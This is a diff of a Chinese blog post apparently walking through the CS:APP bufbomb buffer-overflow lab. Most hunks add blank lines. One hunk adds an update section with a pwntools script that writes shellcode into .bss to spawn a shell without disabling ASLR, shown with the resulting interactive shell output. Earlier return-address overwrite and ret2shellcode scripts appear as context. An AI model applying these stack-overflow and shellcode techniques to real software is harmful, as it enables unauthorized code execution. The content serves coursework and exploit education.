@@ -319,6 +319,7 @@ address = 0x08048E60
 payload = 'a' * 28 + p32(address) + p32(0x00000000) + p32(0x6dfd74c3)
 p.sendline(payload)
 print(p.recv())
+
 ```
 
 可以当作就是在上次的基础上改了个函数地址`fizz`（`0x08048E60`），外加把参数放上去。
@@ -388,6 +389,7 @@ Process finished with exit code 0
 ``` python
 cookie = 0x6dfd74c3
 p.sendline(p32(cookie))
+
 ```
 
 别忘了最后还要跳转到`bang()`（`0x08048E10`）当中，所以就有exp.py：
@@ -403,6 +405,7 @@ p.sendline(payload)
 cookie = 0x6dfd74c3
 p.sendline(p32(cookie))
 print(p.recv())
+
 ```
 
 可以得到：
@@ -499,7 +502,7 @@ void __noreturn bang()
 没有问题。完结撒花。
 
 ### Nitro mode
-其实我们的实验没要求这个，我还没空去看这是干嘛的，昨晚在大佬的指引下搞了这个getshell：
+其实我们的实验没要求这个，我还没空去看这是干嘛的，昨晚在大佬的指导下搞了这个getshell：
 
 ``` python
 from pwn import *
@@ -510,6 +513,7 @@ payload = asm(shellcraft.sh()) + 'a' * (0x20c - 44) + p32(0xFFFFB060)
 p.sendline(payload)
 p.interactive()
 print(p.recv())
+
 ```
 
 这个...由于没有关栈上执行，所以如果关闭了地址随机：
@@ -541,6 +545,44 @@ main.py  pwntools.iml  venv
 有关详细信息，请参考：[基本 ROP - ret2shellcode](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/#ret2shellcode)
 
 本菜鸡就不在这边现学现卖了...
+
+#### 更新
+大佬：
+
+> 甚至不用关aslr就可以得到一个shell，有空再整
+
+好，膜。（两分钟后）大佬：
+
+> 突然想起来它`bss`应该也是可执行的，只要把shellcode写到`bss`就行了，不用那么麻烦
+
+有道理。搞起：
+
+``` python
+from pwn import *
+
+p = process(argv=['/home/domain/Documents/SZU/CSAPP/4/bufbomb', '-n', '-t', 'domain'])
+print(p.recv())
+address = 0x080489C0
+payload = 'a' * 0x20c + p32(address) + p32(0x0804A200 + 0x160) + p32(0x0804A200 + 0x160)
+p.sendline(payload)
+p.sendline(asm(shellcraft.sh()))
+
+```
+
+确实不需要关闭地址随机化也成功了：
+
+```
+/home/domain/IdeaProjects/pwntools/venv/bin/python /home/domain/IdeaProjects/pwntools/main.py
+[x] Starting local process '/home/domain/Documents/SZU/CSAPP/4/bufbomb'
+[+] Starting local process '/home/domain/Documents/SZU/CSAPP/4/bufbomb': pid 5702
+Team: domain
+Cookie: 0x6dfd74c3
+
+[*] Switching to interactive mode
+ls
+main.py  pwntools.iml  venv
+
+```
 
 ## 环境说明
 + 不用说，肯定有IDA。
